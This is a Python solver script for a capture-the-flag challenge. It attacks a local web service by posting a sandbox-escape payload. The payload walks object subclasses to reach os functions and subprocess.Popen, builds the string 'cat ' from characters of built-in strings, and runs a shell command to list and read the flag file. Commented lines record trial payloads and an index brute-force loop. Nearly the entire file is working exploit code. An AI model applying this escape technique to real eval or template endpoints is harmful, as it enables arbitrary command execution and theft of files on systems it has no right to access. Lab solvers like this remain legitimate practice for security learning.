import re
import requests

# strs = (().__class__.__base__.__subclasses__().pop(134).__enter__.__globals__).__str__()
# read = (*(().__class__.__base__.__subclasses__().pop(134).__enter__.__globals__.values()),).__getitem__(109)
# 
# os.read(os.open("solver.py", os.O_RDONLY),10);
# for i in range(len(strs),0,-1):
# (*(().__class__.__base__.__subclasses__().pop(134).__enter__.__globals__.values()),).__getitem__(-5)()
# for i in range(200):
    # payload = f"(().__class__.__base__.__subclasses__().pop(134).__enter__.__globals__).__str__().__getitem__({i})"
    # payload = f"(().__class__.__base__.__subclasses__().pop({i})).__str__()"
    # (*(().__class__.__base__.__subclasses__().pop(134).__enter__.__globals__.values()),).__getitem__(32)().pop(-1) -> dir

    # (*(().__class__.__base__.__subclasses__().pop(134).__enter__.__globals__.values()),).__getitem__(101)

    # (*(().__class__.__base__.__subclasses__().pop(134).__enter__.__globals__.values()),).__getitem__(101)((*(().__class__.__base__.__subclasses__().pop(134).__enter__.__globals__.values()),).__getitem__(32)().pop(-1))

    # payload = f"(*(().__class__.__base__.__subclasses__().pop(134).__enter__.__globals__.values()),).__getitem__({i})"
    # payload = f"(*(().__class__.__base__.__subclasses__().pop(134).__enter__.__globals__.values()),).__getitem__(101)"
    # payload = f"(*(().__class__.__base__.__subclasses__().pop(134).__enter__.__globals__.values()),).__getitem__({i})"

    # result = requests.post("http://localhost:21202/",data={'name':payload}).text
    # if "*" in result:
    # if "function read&gt" in result:

        # getFlag = requests.post("http://localhost:21202/",data={'name':f"(*().__class__.__base__.__subclasses__(),).__getitem__(395)(().__class__.__str__(().__class__).__getitem__(1)+().__class__.__str__(().__class__).__getitem__(3)+().__class__.__str__(().__class__).__getitem__(8)+().__class__.__str__(().__class__).__getitem__(6)+(*(().__class__.__base__.__subclasses__().pop(134).__enter__.__globals__.values()),).__getitem__(32)().pop(-1),stdout=-1,shell=1).communicate()"}).text

        # print(re.findall(r'slashroot6{.*}',getFlag))
        # exit()
    # print(i)
# (*().__class__.__base__.__subclasses__(),).__getitem__(396)(().__class__.__str__(().__class__).__getitem__(1)+().__class__.__str__(().__class__).__getitem__(3)+().__class__.__str__(().__class__).__getitem__(8)+().__class__.__str__(().__class__).__getitem__(6)+(*(().__class__.__base__.__subclasses__().pop(134).__enter__.__globals__.values()),).__getitem__(32)().pop(-1),stdout=-1,shell=1).communicate()

# (*().__class__.__base__.__subclasses__(),).__getitem__(396)(().__class__.__str__(().__class__).__getitem__(1)+().__class__.__str__(().__class__).__getitem__(3)+().__class__.__str__(().__class__).__getitem__(8)+().__class__.__str__(().__class__).__getitem__(6)+(*(().__class__.__base__.__subclasses__().pop(134).__enter__.__globals__.values()),).__getitem__(32)().pop(-1),stdout=-1,shell=1).communicate()


subpprocess = "(*().__class__.__base__.__subclasses__(),).__getitem__(396)"

catstr = "().__class__.__str__(().__class__).__getitem__(1)+().__class__.__str__(().__class__).__getitem__(3)+().__class__.__str__(().__class__).__getitem__(8)+().__class__.__str__(().__class__).__getitem__(6)"

listdirflag = "(*(().__class__.__base__.__subclasses__().pop(134).__enter__.__globals__.values()),).__getitem__(32)().pop(-1)"
flag = requests.post("http://localhost:21202/",data={'name': f"{subpprocess}({catstr}+{listdirflag},stdout=-1,shell=1).communicate()"}).text
print(flag)